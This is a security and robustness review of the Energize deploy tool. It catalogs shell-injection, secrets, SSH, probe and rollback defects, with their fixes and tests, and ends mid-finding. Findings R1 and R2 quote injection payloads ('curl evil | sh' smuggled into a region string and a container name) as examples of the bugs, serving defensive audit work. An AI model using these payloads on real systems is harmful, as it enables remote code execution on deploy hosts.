---
title: Robustness Review
nav_order: 99
---

# Robustness Review — Energize (`nrg`)

**Date:** 2026-07-09
**Scope:** Full codebase — Rust core (`src/`), the Rhai standard library
(`lib/*.rhai`), tests (`tests/`, inline `#[cfg(test)]`), CI (`.github/`), and docs.
**Baseline:** the full test suite (`cargo test --all-targets --locked`) passes at
review time.

This document catalogs robustness gaps: places where the tool can lose data,
leave infrastructure in a broken state, execute an unintended command, or pass a
test suite while shipping a real defect. It is a map of where the guarantees stop —
a companion to `docs/safety.md`, which describes where they hold.

## How to read this

Findings are grouped by subsystem and tagged **Critical / High / Medium / Low**.
Severity reflects blast radius × likelihood in a realistic production deploy, not
code aesthetics. Each finding names a concrete failure scenario. A short **Verified**
note means the behavior was confirmed by reading the exact code path (file:line),
not inferred.

The codebase is, on the whole, unusually careful — see
[What is already solid](#what-is-already-solid). Most of the highest-severity items
below are in the **Rhai standard library** (`lib/`), which does the actual deploy
orchestration and has far weaker test coverage than the Rust core.

---

## Summary of highest-priority items

| # | Severity | Area | One line |
|---|----------|------|----------|
| R1 | High | stdlib / registry | ✅ resolved — `region` interpolated unquoted into an ECR login subshell (injection) |
| R2 | High | stdlib / runtime | ✅ resolved — `runtime_exec_cmd(name, command)` interpolated `container_name` unquoted (injection) |
| R3 | High | secrets | ✅ resolved — `ENC[...]` tokens are never decrypted at runtime — raw ciphertext reaches commands |
| R4 | High | engine / sim | ✅ resolved — probe classifier treated "command not found" as "container absent" |
| R5 | High | engine / ssh | 🟡 partially resolved — SSH keep-alive added (dead-connection case closed); no overall command wall-clock timeout yet (a genuinely-alive-but-slow command still blocks the deploy and the lock) |
| R6 | High | stdlib / rollback | ✅ resolved — compensation failures are logged-and-continued, so a failed proxy-restore still deletes the serving container |
| R7 | High | engine / signals | ✅ resolved — no SIGINT/SIGTERM handling — Ctrl-C mid-deploy runs zero compensations |
| R8 | High | tests | the live deploy path is never executed; only dry-run plan strings are asserted; `rollback()` has no tests |
| R9 | Medium | engine / ssh | ✅ resolved — SSH alias pre-resolution dropped `Port`/`IdentityFile`/`ProxyJump` from the user's ssh config; every ssh-spawning command now passes the alias straight through and lets the real `ssh` binary resolve it |
| R10 | Medium | stdlib / deploy | ✅ resolved — `:latest` default tag silently broke the rollback chain; `deploy()` now warns, `rollback()` now refuses an automatic mutable-tag snapshot |
| R29 | High | stdlib / rollback | ✅ resolved — nesting `deploy()` inside a user `transaction()` could resurrect post-committed compensations into a blackhole (found during R6's review; pre-existing, not caused by R6) |
| R30 | Medium | stdlib / docker | ✅ resolved — `docker_run`/`docker_run_once` ignored a failed env-file write — a stale file from a prior run could be silently reused (found during R3b's review) |
| R31 | Medium | engine / sim | ✅ resolved — Podman's absent-image wording (`image not known`) didn't match the probe classifier's `"no such"` check (found during R4's review; pre-existing, not caused by R4) |
| R32 | Low | engine / sim | ✅ resolved — a LOCAL spawn failure (e.g. `ssh` missing on the machine running `nrg`) formats as "...No such file or directory", which the probe classifier's `"no such"` check misread as "container absent" (found during R4b's review; pre-existing, not caused by R4b) |

---

## 1. Shell safety in the standard library

The library establishes a strong contract (issue #10): every user-influenced value
spliced into a remote command must be `sh_quote()`'d. Two exported helpers break it.

### R1 — High — `ecr_login` interpolates `region` unquoted into a subshell
`lib/registry.rhai` (~line 83). **Verified.**

The account-auto-detect branch builds:
```rhai
login_cmd += "\"$(aws sts get-caller-identity ...).dkr.ecr." + region + ".amazonaws.com\"";
```
`region` flows from `cfg` and is spliced **raw** inside double quotes, where `$`,
backticks, and `\` stay live (the sibling occurrence on the line above *is*
`sh_quote()`'d — this one was missed). A region like
`us-east-1".amazonaws.com"; curl evil | sh; "` runs arbitrary commands on the host
as the deploy user.
**Fix:** `sh_quote(region)`, or validate the region against `^[a-z0-9-]+$`.

**Resolved (2026-07-10).** `region` is now spliced in as its own `sh_quote()`'d
(single-quoted) segment, adjacent to the surrounding double-quoted segments —
shell concatenates adjacent quoted strings with no separator, and single quotes
keep the region's contents fully literal regardless of `$`, backticks, `;`, or
embedded `"`. Covered by a real end-to-end test that runs the exact constructed
command through a real shell (`local_exec`, live — not dry-run) with a region
crafted to break out of the old unquoted context, and asserts the injected
`touch` never ran (`tests/shell_injection.rs`). Verified by reverting the fix
and confirming the test fails (the marker file IS created) against the
original code.

### R2 — High — `runtime_exec_cmd(container_name, command)` quotes neither argument
`lib/runtime.rhai:146`. **Verified.**

```rhai
fn runtime_exec_cmd(container_name, command) {
    container_cmd() + " exec " + container_name + " " + command
}
```
`docker_exec` in `docker.rhai` quotes the container name; this exported twin does
not. Any caller passing a user-influenced name (`app;curl evil|sh`) gets remote
code execution. `command` is a documented raw escape hatch, but `container_name`
should be quoted.
**Fix:** `sh_quote(container_name)`.

**Resolved (2026-07-10).** `container_name` is now `sh_quote()`'d, matching
`docker_exec`'s existing contract; `command` remains an intentional raw
escape hatch (see R28 below). Covered by the same real-shell-execution test
approach as R1 (`tests/shell_injection.rs`), also verified to fail against
the original code.

### R17 — Low — Caddy admin-API service names are shell-quoted but not URL-encoded
`lib/caddy.rhai` (lines 144, 167, 181, 192). A `service` containing `/` or `../`
(e.g. `x/../../config/admin`) addresses arbitrary Caddy config paths — `proxy_remove`
could `DELETE` unrelated config. Use `url_encode()` (already available) on path
segments.

### R19 — Low — env keys/values written to env-files without newline/`=` validation
`lib/docker.rhai:134`. The comment says "callers must avoid newlines"; nothing
enforces it. A CI-sourced value containing `\n` (a PEM key) injects extra
`KEY=VALUE` lines into the container environment. Validate or reject control chars.

### R28 — Low — documented raw escape hatches
`cfg.extra`, `docker_run_once`'s command, `docker_exec`'s command, and
`pre_deploy_cmd` / `post_deploy_cmd` are interpolated verbatim into remote shell
commands (`docker.rhai`, `deploy.rhai:300`). This is intentional, but the safety
contract silently exempts four fields — a reader who trusts "everything is quoted"
is wrong. Document these prominently as trusted-input-only.

---

## 2. Secrets

### R3 — High — `ENC[...]` tokens are never decrypted at runtime
`src/engine/secret.rs` (`lookup_secret`) vs `src/secrets/mod.rs`. **Verified** —
there is no reference to `ENC[` or `decrypt` anywhere under `src/engine/`.

`nrg secrets encrypt` produces an `ENC[...]` token and the docs (`docs/cli.md`)
tell users to paste it into config or an env file. But `secret("NAME")` reads the
value verbatim from `.env` / `.energize/secrets` and never decrypts it. A user who
follows the documented workflow ships the **raw ciphertext** as the database
password / registry token. The encrypt/seal feature and runtime resolution are only
connected by the operator manually `unseal`-ing first — which is undocumented as a
requirement.
**Fix:** either decrypt `ENC[...]` tokens in `lookup_secret` (locate the key via the
existing `find_key_file`), or document loudly that inline `ENC[...]` in `.env` is
**not** auto-decrypted and only whole-file `seal`/`unseal` is supported.

**Resolved (2026-07-10).** `secret()` now transparently decrypts an `ENC[...]` value
via the discovered `.nrg-key` before it's ever used, throwing a clear error if no key
is found or decryption fails (`src/engine/secret.rs`'s `decrypt_if_needed`). This also
surfaced and fixed a second, related bug: `nrg secrets encrypt`'s `age -a` armored
output is multi-line PEM, which can never survive being pasted into a single
`KEY=VALUE` line — `encrypt_value`/`decrypt_value` (`src/secrets/mod.rs`) now
`|`-join/split the armor so the token is actually single-line-safe, which the
documented "paste into `.env`" workflow requires. Covered end-to-end by
`tests/secrets_age.rs`'s `secret_transparently_decrypts_an_enc_token_pasted_into_env`
(closes the "nothing pins what `secret()` does with a sealed value in `.env`" gap
noted below under "Secrets error paths").

### R24 — Low — full effective config (with revealed secrets) persisted to state
`lib/deploy.rhai:243`. `state_set(service + ".config", to_json(cfg))` writes every
env value — typically revealed secrets — as plaintext JSON into
`.energize/state.json`. `0600` mitigates local exposure, but workspace archiving,
CI artifact upload, or a state backup exfiltrates them. Consider redacting secret
env values from the persisted config, or storing only non-secret keys.

### R8b / secrets CLI — Medium — plaintext on argv
`src/cli/secrets.rs`. `nrg secrets encrypt <value>` and `decrypt <token>` take the
value **on the command line** (visible in `ps` and shell history) — ironic given the
care the exec builtins take to keep passwords off argv. Add a stdin mode
(`--stdin` / read when value omitted).

### unseal writes plaintext without 0600
`src/secrets/mod.rs` (`unseal_file`). The decrypted `.env` is written with the
process umask, not `0600`, and overwrites any existing `.env` without warning. A
locally edited `.env` is silently clobbered, and the plaintext sits world-readable
by default.

### pubkey scraped from stderr without validation
`src/secrets/mod.rs` (`generate_key_pair`). The public key is parsed from
`age-keygen` stderr and `unwrap_or("")` — if the output format drifts, an **empty**
`.nrg-key.pub` is written silently and every later `encrypt` fails cryptically.
Validate the extracted key starts with `age1`.

### R27 — Low — runtime choice leaks across projects
`lib/runtime.rhai`. `set_runtime()` stores into the **persistent global** state
store, so a `podman` choice in one project leaks into a later run of a different
script on the same control machine that never called `set_runtime`. Under dry-run
auto-detect always resolves to `docker`, so the plan can show `docker …` while the
live run issues `podman …`.

---

## 3. SSH execution (`src/engine/runner.rs`, `src/ssh/config.rs`)

### R5 — High — no command timeout, no SSH keep-alive — 🟡 partially resolved
`RealRunner`. `ssh_command` sets `ConnectTimeout=10` (connect only) but no
`ServerAliveInterval` / `ServerAliveCountMax` and no overall command timeout. A
remote command that hangs after connecting (network partition mid-run, a wedged
`docker pull`, a stuck healthcheck) blocks the calling thread **forever** — and
because a live run holds the advisory state lock for its whole lifetime, it wedges
every future run on that project too.
**Fix:** add `-o ServerAliveInterval=15 -o ServerAliveCountMax=4`, and consider a
wall-clock cap per command.

**Partially resolved (2026-07-10).** Took the first half: `ssh_command`
(`src/engine/runner.rs`) now also sets `ServerAliveInterval=15` and
`ServerAliveCountMax=4`. This closes the "network partition mid-command,
connection goes silently dead" case — `ssh` itself now probes the
connection and exits non-zero after ~60s of no replies, instead of blocking
in a `read()` that a dead TCP connection alone never unblocks. Covered by a
unit test, `ssh_command_sets_keepalive_options`
(`src/engine/runner.rs`), that inspects the actual built `Command`'s args —
confirmed to fail (missing both options) against the code before this fix.
An Opus review pass on this fix flagged that `nrg logs`'s own separate ssh
invocation (`src/cli/logs.rs`, used for the `-f` follow-mode long-lived
stream) had the identical exposure — fixed the same way in the same slice
(`ssh_stream_command`, with its own equivalent unit test). A follow-up
Fable review flagged that `nrg app exec`'s own separate ssh invocation
(`src/cli/app.rs`, `ssh_extra_args`) had the same gap (lower severity — this
call site holds no state lock — but the non-interactive path is documented
CI-safe, so an unattended hang there is still a real problem) — fixed the
same way, with both of its existing unit tests updated to assert the new
options. That same Fable pass also flagged that neither
`ssh_command_sets_keepalive_options` nor
`ssh_stream_command_sets_keepalive_options` pinned the `--`
end-of-options separator's *position* (only that the keep-alive options
were present) — a regression that moved or dropped `--` would have slipped
through undetected, even though the `starts_with('-')` host guard is a
second independent layer against option injection. Both tests gained an
exact-equality assertion on the trailing args to pin `--`'s placement, and
the illustrative `ssh` invocation in `docs/architecture.md` (which was
missing `--` even before this session) was corrected to match.

**Still open:** this does NOT cap how long a genuinely-alive, slow remote
command may run (a wedged `docker pull` that's still technically
responsive at the TCP level, or a healthcheck loop that's just slow). That
needs a separate wall-clock timeout wrapping each command — a larger change
(deciding a sensible default/override knob, and how it interacts with the
R7 interrupt-handling `on_progress` poll, since a killed-by-timeout command
and a killed-by-signal command should probably behave the same way toward
the enclosing transaction) — not attempted in this slice.

### R9 — Medium — alias pre-resolution defeats `~/.ssh/config` — ✅ resolved
`SshConfig::resolve_host` reads only `HostName` and `User`, builds `user@hostname`,
and hands **that** to `ssh`. Because the argument is now a literal address, `ssh`'s
own `Host` block matching never fires, so `Port`, `IdentityFile`, `ProxyJump`,
`ProxyCommand`, `IdentitiesOnly`, etc. from the user's config are **silently
dropped**. An alias defined with `Port 2222` connects on 22.
**Fix:** pass the original alias to `ssh` and let ssh resolve it, or parse and
forward the remaining directives. At minimum, document that only `HostName`/`User`
are honored.

**Resolved (2026-07-10).** Went with the first option: every command that spawns
a real `ssh` (`RealRunner::ssh_command` in `src/engine/runner.rs`, used by `nrg
exec`/`nrg run`; `nrg ssh`; `nrg app exec`; `nrg logs`) now passes the ORIGINAL
alias straight through, instead of a hand-resolved `user@hostname` string — the
REAL `ssh` binary does its own, complete config resolution, exactly like a plain
interactive `ssh <alias>` would, so `Port`/`IdentityFile`/`ProxyJump`/
`ProxyCommand`/`IdentitiesOnly`/`Host *` wildcards/`Match` blocks all apply
correctly, for free, without reimplementing any of them. `RealRunner` no longer
holds an `SshConfig` at all (there's nothing left for it to consult) — a genuine
simplification, not just a workaround. `nrg app exec` and `nrg ssh` still call
`SshConfig::resolve_host` once, but ONLY to print a friendly "Connecting to
HostName..." confirmation line — that value is no longer used as the actual
connection target, so a resolver that's wrong or incomplete there is now purely
cosmetic, never a silent misconnection. The option-injection defense
(`looks_like_option`/`starts_with('-')`) now checks the alias itself (the thing
actually reaching `ssh`'s argv) rather than a resolved value, which is the more
direct and correct place to check it anyway.

Covered by three new end-to-end integration tests in
`tests/ssh_alias_passthrough.rs` (`nrg_ssh_passes_the_alias_through_unresolved`,
`nrg_app_exec_passes_the_alias_through_unresolved`,
`nrg_logs_passes_the_alias_through_unresolved`) using a FAKE `ssh` executable on
`PATH` that records its own argv, paired with a `~/.ssh/config` Host block
mapping the test alias to a deliberately different, distinctive `HostName`/`User`
— proving the real invocation contains the alias and NOT the substitute address.
All three mutation-verified (reverted each file's fix back to using the resolved
value, confirmed the corresponding test fails on the substitute address, restored).
`RealRunner::ssh_command`'s own existing unit tests were sufficient evidence for
that call site — it no longer has any `SshConfig` to consult at all, so there's
no separate resolution behavior left to prove wrong.

This fix also neuters most of the SSH config parser fidelity gap below for the
connection-building path specifically (ssh's own native config parsing handles
wildcards/`Match`/`Include` correctly regardless of this project's parser) — that
finding still applies to the now-purely-cosmetic "Connecting to..." display line
in `nrg app exec`/`nrg ssh`.

### SSH config parser fidelity — Medium
`src/ssh/config.rs` handles only single-name `Host alias` blocks with exact,
case-sensitive matching. It does **not** support `Host *` wildcards, multi-pattern
lines (`Host web1 web2`), `Match` blocks (explicitly skipped), or `Include`. A user
whose `~/.ssh/config` sets `User deploy` under `Host *` connects as the wrong user.
No test documents the divergence. Since R9's fix (above), this parser's output is
no longer used to build any actual SSH connection — only the informational
"Connecting to..." display line in `nrg app exec`/`nrg ssh` — so this gap's
practical impact is now purely cosmetic (a wrong/incomplete confirmation message),
not a silent misconnection.

### piped() write-before-read can deadlock on large payloads — Medium
`runner.rs` (`piped`). It writes the entire stdin payload, then reads output. For a
small password this is fine (as the comment notes), but `write_remote` of a large
env-file/config while the remote writes >64 KB to stdout can fill the OS pipe buffer
and deadlock both sides. Use a writer thread or `spawn` + concurrent drain for
large payloads.

### Signal-killed process indistinguishable from spawn failure — Low
Exit code `-1` is returned for spawn failure, wait failure, option-injection
rejection, **and** a signal-terminated process (`status.code()` is `None`). Scripts
branching on `exit_code` can't tell these apart. Consider `128 + signal` for the
signal case.

### No connection reuse — Low/Medium
Every builtin call opens a fresh SSH connection. A `wait_healthy` loop reconnects
every 2 s × 30, and a fleet command reconnects per host per call. `ControlMaster` /
`ControlPersist` would cut deploy latency substantially.

---

## 4. Dry-run / live divergence and probes (`src/engine/builtins/sim.rs`)

### R4 — High — probe classifier mistakes a missing CLI for an absent container — ✅ resolved
`sim.rs:44` (`probe_absent_or_err`). **Verified.**

```rust
if err.contains("no such") || err.contains("not found") { return Ok(false); }
```
The function's own doc comment says a missing CLI (exit 127) "must surface as an
error, never be mistaken for 'not running'." But `docker: command not found`
contains the substring `not found`, so on a host **without** the container runtime,
a live probe returns "container absent" instead of throwing. The deploy then takes
the fresh-install branch against a host where nothing can run, failing confusingly
mid-flight instead of at a clear precondition.
**Fix:** match the runtime's actual absent-object phrasing (`no such object`,
`no such container`, `no such image`) and exclude `command not found` (exit 127).

**Resolved (2026-07-10).** `probe_absent_or_err` now checks `exit_code == 127`
FIRST and unconditionally throws (naming the exit code and suggesting the
runtime may not be installed), regardless of stderr wording — a shell's exact
"command not found" phrasing isn't a stable contract to text-match against
(bash says `docker: command not found`; dash/POSIX `sh` says `docker: not
found`); even if some shell used a different exit code, the fail-safe
direction is preserved, since the only remaining path to "absent" is a
`"no such"` match. The `"not found"` substring branch was removed entirely:
Docker's and (for containers) Podman's real absent-object responses (`No
such container`, `No such image`) contain `"no such"`, already covered, so
nothing legitimate relied on the removed branch. Covered by a new unit test,
`live_probe_missing_cli_throws_instead_of_reporting_absent`
(`src/engine/builtins/sim.rs`), using a fixture runner that returns exit 127
with `"bash: docker: command not found"` — confirmed to fail (wrongly
reporting the container absent) against the original code before the fix.

An Opus review pass on this fix flagged that Podman's absent-**image**
wording is reportedly `image not known` — not `"no such"` — so `real_image_id`
on Podman may still throw instead of correctly reporting an absent image on
a first deploy. This is a distinct, **pre-existing** gap (the old `"not
found"` branch didn't catch `"image not known"` either, so R4's fix neither
causes nor widens it) and is unverified against a real Podman install here.
Tracked separately as R31 below rather than folded into this fix.

### R31 — Medium — Podman's absent-image wording may not be recognized by the probe classifier — ✅ resolved
`sim.rs:63` (`probe_absent_or_err`, the `"no such"` check used by
`real_image_id`). Originally flagged as unverified by an Opus review pass on
R4; a Fable final-review pass then independently confirmed it against
Podman's actual source.

Podman's `image inspect` on a missing image says `Error: <tag>: image not
known` rather than Docker's `Error: No such image: <tag>` — confirmed
against `containers/storage`'s `ErrImageUnknown = "image not known"` (the
error `LookupImage`, which backs `podman image inspect`, returns on a
missing image) and matching real-world CLI output reports. This does NOT
match the `"no such"` substring the shared classifier relies on, so a first
deploy of a new image tag under `rt::set_runtime("podman")` would throw a
"container probe failed" error instead of correctly treating the image as
not-yet-pulled.
**Fix:** verify Podman's actual `image inspect` failure text on a real
Podman install (and nerdctl's, while at it — also unverified here), and
either broaden the classifier's absent-match set or special-case it per
configured runtime.

**Resolved (2026-07-10).** `real_image_id` now recognizes `"image not
known"` directly, scoped to the image probe only (not folded into the
shared `probe_absent_or_err` classifier, which container probes also use —
that phrasing is specific to `image inspect`). nerdctl's absent-image
wording remains unverified; if it turns out to differ from both Docker's
and Podman's, the same scoped-check pattern applies. Covered by a new unit
test, `live_image_id_recognizes_podmans_absent_image_wording`
(`src/engine/builtins/sim.rs`), using a fixture runner returning exit 125
with `"Error: myapp:v1: image not known"` — confirmed to fail (throwing
instead of reporting absent) against the code before this fix.

### R32 — Low — a local spawn failure's own error text can trip the "no such" absent-match — ✅ resolved
`src/engine/builtins/sim.rs` (`probe_absent_or_err`). Found while reviewing R4b's
new `docker_container_running` call site: `RealRunner::run_ssh`/`run_local` (and
their `*_stdin` siblings) report a LOCAL spawn failure — e.g. the `ssh` binary
itself isn't installed on the machine RUNNING `nrg` — as `exit_code: -1` with a
message like `"ssh spawn failed: No such file or directory (os error 2)"`
(`io::ErrorKind::NotFound`'s Display text). That message itself contains "no
such" — the exact substring `probe_absent_or_err` treats as a legitimate
"container/image absent" answer — so a probe that never even ran was silently
misclassified as "the entity doesn't exist" instead of "the probe failed to
run", exactly the R4/R31 bug class but for a different, LOCAL root cause.

In practice this is narrow: `ssh` being missing on the calling machine breaks
literally every other command `nrg` issues too (all of them shell out through
the same `ssh -o BatchMode=yes ...` invocation), so it isn't a realistic
"otherwise-working nrg install" scenario — but it directly undermined R4b's new
guard specifically (in this sandbox, `docker_container_running` silently
reported "not running" instead of erroring, since `ssh` isn't installed here),
which is what surfaced it.

**Resolved (2026-07-10).** `probe_absent_or_err` now checks `exit_code < 0`
first — `-1` is this codebase's own sentinel for "not a real process exit"
(local spawn/wait failure, an option-injection rejection, or a signal-killed
process; see the fields' usage across `RealRunner`) — and unconditionally
errors, mirroring exit 127's existing handling for the analogous remote-side
case. Covered by a new unit test,
`live_probe_local_spawn_failure_throws_instead_of_reporting_absent`
(`src/engine/builtins/sim.rs`), using a fixture runner reproducing the exact
`exit_code: -1` / `"...No such file or directory..."` shape — confirmed to fail
(reporting absent instead of throwing) against the code before this fix.

### R16 — Medium — live port scan assumes `nc`, treats any nonzero as "free"
`sim.rs:111` (`real_port_open`), surfaced via `deploy.rhai:323`. `nc -z ...` exit
!= 0 is read as "port free". On a host without `nc`, **every** candidate looks free
(exit 127), so `pick_port` returns `base+10000` even when a container already binds
it — the deploy dies later with an opaque `docker run -p` bind error inside the
transaction. Also: only localhost-bound listeners are seen, and base ports ≥ 55536
saturate `u16` so all 100 candidates collapse to the same port. Plus a TOCTOU gap
between the scan and `docker run`.

### Fixed 60 s live probe budgets — Medium
`sim_container_healthy` and `sim_wait_port` loop `30 × 2 s` hard-coded. A
slow-booting app (migrations, JIT warmup) fails a deploy spuriously with no knob to
extend it. See also R11 (this budget compounds with the stdlib's own retry loop).

---

## 5. Deploy orchestration & rollback (`lib/deploy.rhai`, `lib/caddy.rhai`)

### R6 — High — rollback blackhole: a failed compensation still deletes the live container
`lib/deploy.rhai` (~360–385) with `src/engine/transaction.rs:70`. **Verified**
(unwind logs and continues on a failed compensation).

During unwind, if the restore-proxy compensation fails (SSH blip, the proxy's health
gate rejecting a degraded old container, or a bogus `old_target` per R10/R4-fallback),
the unwind **continues** to the next compensation and `docker rm -f`'s the new
container — which the proxy is still pointing at. Traffic on that host is blackholed
by the rollback itself.
**Fix:** make the "remove new container" compensation conditional on the proxy
having been successfully restored (guard on the restore result), or order the
compensations so traffic is never pointed at a container that is about to be removed.

**Resolved (2026-07-10).** `deploy_one_host` (`lib/deploy.rhai`) now guards the
rm-new compensation on TWO shared flags: `proxy_switched` (set once the
FORWARD switch to the new container actually happens) and `proxy_restored`
(set only once the restore-proxy compensation's `px_deploy` call returns
*without* throwing). The rm-new compensation skips the removal — with an
operator-facing message explaining why — only when `proxy_switched &&
!proxy_restored`: the proxy was pointed at the new container AND the restore
back genuinely failed. Rhai closures that reference the same outer-scope
variable share the same underlying cell (empirically confirmed against the
real engine, not just assumed from documentation), so a write in one
compensation is visible from the other despite being invoked at different
points during the unwind.

A first version of this fix used a single `proxy_restored` flag and was
caught by an Opus review pass as a regression: rm-new is registered
IMMEDIATELY after the container starts, *before* the health check and the
forward switch — so on a health-check failure (the most common failure mode)
only rm-new is ever registered, `proxy_restored` stays false, and the
single-flag guard would wrongly leave the never-healthy new container running
on every failed deploy (there's no blackhole risk there — the proxy was never
switched away from the still-running old container — so removal is exactly
the pre-R6-fix, correct behavior). The second `proxy_switched` flag narrows
the guard to the genuinely unsafe case.

Covered by three Rust-level unit tests mirroring this exact shape against the
real `transaction()`/`on_rollback()` machinery
(`src/engine/transaction.rs::guarded_compensation_skips_its_destructive_step_when_the_prior_one_fails`,
its happy-path counterpart, and
`guarded_compensation_still_runs_when_the_proxy_was_never_switched` for the
health-check-failure shape) — each "must skip" / "must still run" assertion
was confirmed to fail against the corresponding buggy variant (the fully
unguarded pattern, and separately the single-flag guard) before its guard was
added. As with the rest of the deploy path (R8), this doesn't exercise the
literal `lib/deploy.rhai` file end-to-end in live mode (that would need a
real Docker daemon and a real HTTP health check) — the tests instead mirror
`deploy_one_host`'s exact registration order and guard logic through the real
engine.

### R10 — Medium — `:latest` default tag breaks the rollback chain — ✅ resolved
`lib/recipe.rhai:34` (`env_or("DEPLOY_TAG", "latest")`) with
`deploy.rhai:170`. **Verified.**

The rollback pointer `<service>.prev` is only written when `prev_image != image`
(a **string** compare). Two `:latest` deploys compare equal, so `.prev` is never
recorded and `rollback()` throws "No rollback image found." Even when it doesn't,
`:latest` on the host has already been overwritten by the broken build, so a
"rollback" re-pulls the same broken image. Default to an immutable tag (git SHA), or
refuse to deploy a mutable `:latest` without an explicit opt-in.

**Resolved (2026-07-10).** Went with a warn-loudly-but-don't-break-the-quickstart
approach rather than a hard refusal: `:latest` (`env_or("DEPLOY_TAG", "latest")`) is
the documented default for a first deploy (`docs/getting-started.md`), so outright
blocking it would break that flow. Instead:

- `deploy()` now prints a clear `[warn]` when the resolved tag is `:latest` (or has
  no tag at all — Docker treats these identically), explaining that rollback may not
  be able to safely undo this build.
- `rollback()` now **throws**, before touching any host, when the image it's about
  to redeploy comes from the automatic `<service>.prev` snapshot AND that snapshot
  is itself a mutable `:latest` tag — this is the actually-dangerous silent case the
  finding describes (a "rollback" that quietly redeploys the same broken bits). An
  **explicit** `cfg.image` override passed by the caller is a deliberate, informed
  choice and is deliberately NOT second-guessed by this check.
- The pre-existing "No rollback image found" error (when `.prev` was never
  recorded at all, because every deploy so far shared the identical `:latest`
  string) now hints at the `:latest` root cause when it applies, instead of leaving
  the operator to guess why no snapshot exists.

Both `extract_version(image)` checks reuse the file's own existing tag-parsing
helper (already correctly treating a missing tag as `"latest"`), so no new
tag-parsing logic was introduced — the comparison itself is case-insensitive
(`.to_lower() == "latest"`), added after an adversarial Fable review pass found
that Docker's tag charset (`[\w][\w.-]{0,127}` per the distribution spec) allows
uppercase, so a tag literally spelled `LATEST` or `Latest` is syntactically valid
and distinct from `latest` — and silently bypassed BOTH the warning and the
refusal before this was fixed. Deliberately NOT handled (see "Still open" below):
leading/trailing whitespace, an empty tag, and non-ASCII homoglyphs — none of
these are valid characters in Docker's own tag charset, so they can never occur
in a tag that actually round-tripped through a real registry; handling them would
be defending against inputs Docker itself already rejects.

Covered by 8 new integration tests in `tests/deploy_behaviors.rs`
(`deploy_warns_when_deploying_a_mutable_latest_tag`,
`deploy_warns_when_tag_is_omitted_entirely_since_it_implies_latest`,
`deploy_with_a_pinned_tag_does_not_warn`, `deploy_warns_on_a_case_variant_of_latest`,
`rollback_refuses_to_use_a_mutable_latest_snapshot`,
`rollback_refuses_a_case_variant_of_the_mutable_latest_tag`,
`rollback_with_an_explicit_image_override_ignores_the_mutable_tag_guard`,
`rollback_with_no_prev_state_hints_at_the_mutable_tag_gotcha_when_relevant`), each
confirmed to fail against the pre-fix code.

**Still open:** the detection is NAME-based — it only recognizes the literal
`:latest` tag (or no tag at all, which Docker treats identically). An operator
using a different, self-chosen mutable tag (e.g. `repo:stable`, `repo:prod`)
gets neither `deploy()`'s warning nor `rollback()`'s refusal, and the same
string-compare snapshot in `deploy()` breaks the rollback chain for that tag in
exactly the same way `:latest` used to. This is likely unfixable from local
script logic alone — nothing here can know that `stable` is mutable the way
`latest`/no-tag is mutable by Docker's own convention. Separately, even for
`:latest` itself, this doesn't (and can't, from local script logic alone)
protect against the tag being re-pushed to a DIFFERENT value by some entirely
separate process after `.prev` was recorded but before a rollback runs — that's
inherent to using any mutable tag at all, not something a local check can
detect. Pinning to immutable digests (`repo@sha256:...`) throughout would close
both residual gaps but is a larger, separate change (`extract_version` and the
whole image-tag plumbing currently assume a `repo:tag` shape).

### R4b — Medium — `old_target` fallback uses the container port, not a host port — ✅ resolved
`deploy.rhai:311`. **Verified.** When no `.target`/`.port` state exists (fresh CI
runner, unshared state), `old_target` falls back to `"localhost:" + container_port`
— the in-container port, not the real host port. A mid-deploy failure then restores
the proxy to `localhost:3000` where nothing listens, then removes the new container:
an outage caused by the rollback.

**Resolved (2026-07-10).** `deploy_one_host`'s `old_target` computation
(`lib/deploy.rhai`) gained a third branch, checked before falling back to the
container-port guess: if a canonical old container (`<service>-web`) is
actually running on the host (via the existing `docker_container_running`
sim-routed probe — no new engine primitive needed), that means state was
lost or never shared with this host, NOT that this is a genuine first
deploy — guessing the wrong port here is exactly the R4b danger. The
function now **throws**, before picking a port or starting the new
container, naming the service/host and telling the operator to
`state_set` the real port before retrying. Only when NEITHER state NOR a
running old container exists (a genuine first deploy, or a newly added
fleet host) does the original `"localhost:" + container_port` fallback
still apply — there's nothing to roll back to in that case regardless, so
a guessed target can't make anything worse.

Covered by two new in-crate Rust unit tests
(`src/engine/eval.rs::deploy_throws_when_old_container_is_running_but_no_port_state_is_recorded`
and `::deploy_falls_back_to_the_container_port_when_no_old_container_is_running_either`)
that load the REAL `lib/deploy.rhai` via a `FakeRunner`, each confirmed to
fail (or pass for the wrong reason) against the pre-fix code. Both tests
run in LIVE mode (not `--dry-run`) since `docker_container_running`'s
dry-run seeding assumes an unreachable host is absent, which would mask
exactly the branch under test; LIVE mode also required deliberately NOT
letting either test's deploy reach the health-check phase (`wait_healthy`
does a REAL HTTP request in live mode, `src/engine/builtins/http.rs`), to
avoid a slow/hanging test — the "falls back" test intentionally lets the
deploy fail one phase later (port-picking exhausts its 100 candidates,
since the same all-zero-exit `FakeRunner` default also makes `nc -z`
report every port busy) and asserts on that distinct error instead of a
full successful deploy.

An Opus review pass on this fix surfaced a separate, pre-existing gap in
the probe classifier this new `docker_container_running` call relies on
— see **R32** above (found here, not caused by this fix, and fixed in the
same slice).

### R3b — High — `caddy proxy_boot` ignores a failed config write — ✅ resolved
`lib/caddy.rhai:65` (pre-fix: `:60`). `write_remote(host, base, "/etc/caddy/caddy.json")` needs a
root-writable `/etc` and its result is unchecked; `docker run -d` returns 0
regardless. A non-root deploy user can't write `/etc/caddy`, docker's `-v` then
creates a directory at the path, Caddy crash-loops, but `proxy_boot` reports
success. The failure only surfaces later as opaque curl errors during the traffic
switch — inside the fleet transaction. Check the `write_remote` result.

**Resolved (2026-07-10).** `proxy_boot` now checks `write_remote`'s
`ExecResult` and throws (naming the host and path, with `stderr`) before ever
attempting to start the Caddy container, matching the same
check-and-throw contract used by every other fallible call in the stdlib.
Covered by an in-crate Rust unit test
(`src/engine/eval.rs::caddy_proxy_boot_throws_when_the_config_write_fails`)
that loads the REAL `lib/caddy.rhai` (not a reimplementation) via a
`FakeRunner` configured to fail specifically the config-write command, and
asserts both the thrown message and that `docker run` for Caddy is never
attempted afterward — confirmed to fail (proceeding to start Caddy anyway)
against the original unchecked code before the fix.

### R30 — Medium — `docker_run`/`docker_run_once` also ignore a failed env-file write
`lib/docker.rhai:161,205`. **Found by Fable's final review of R3b** (same bug
class, different file — not yet fixed).

Both functions write the container's env vars to a remote file via
`write_remote(host, ..., env_path)` (off-argv, for secrets) and discard the
result, exactly like the pre-fix `caddy proxy_boot`. This is a narrower
window than R3b, because the very next step (`docker run --env-file
